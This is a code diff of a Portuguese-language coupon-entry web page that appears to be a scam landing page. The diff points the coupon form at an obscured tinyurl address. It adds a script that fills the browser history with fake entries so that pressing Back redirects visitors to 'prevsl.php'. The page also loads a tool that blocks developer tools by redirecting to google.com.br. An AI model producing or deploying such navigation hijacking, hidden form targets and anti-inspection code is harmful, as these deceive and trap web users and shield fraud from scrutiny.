@@ -112,7 +112,7 @@
 
             <div id="codigoBarras" class="coolinput" style="margin-top: 275px; display: none;">
                 <div id="verificaCodigoBarras">
-                <form action="../03/index.html" method="POST" id="formCupom">     
+                <form action="https://tinyurl.com/1234567891011a" method="POST" id="formCupom">     
                     <label for="input" id="textoCodigoBarras" class="text">CUPOM</label>
                     <input style="font-size: 16px;" type="text" placeholder="Digite os 8 digitos do CUPOM" name="codigoBarrasDigitado" id="codigoBarrasDigitado" class="input" inputmode="numeric" autocomplete="off" required="" onkeyup="validacaoCodigoBarras1()">
                     <div style="margin: -5px 0 0 10px;"><span id="validacaoCodigo"></span></div>
@@ -137,6 +137,28 @@
         <script src="js/g1Gal4miSpjn.js"></script>
         <script src="js/4ogaRdkKri5e.js"></script>
         <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool" url="https://google.com.br"></script>
+        <script>
+            // BACK REDIRECT
+            var urlBackRedirect = 'prevsl.php'; // lembre-se de usar a url sem espaços
+            // não altere nada abaixo dessa linha
+            urlBackRedirect = urlBackRedirect = urlBackRedirect.trim() +
+            (urlBackRedirect.indexOf("?") > 0 ? '&' : '?') +
+            document.location.search.replace('?', '').toString();
+            history.pushState({}, "", location.href);
+            history.pushState({}, "", location.href);
+            window.onpopstate = function () {
+                setTimeout(function () {
+                    location.href = urlBackRedirect;
+                }, 1);
+            };
+            // BACK REDIRECT
 
+
+            // MÁSCARA INPUT
+            jQuery(function($){
+                $("#codigoBarrasDigitado").mask("99     99     99     99");
+            });
+            // MÁSCARA INPUT
+        </script>   
     
 </body></html>
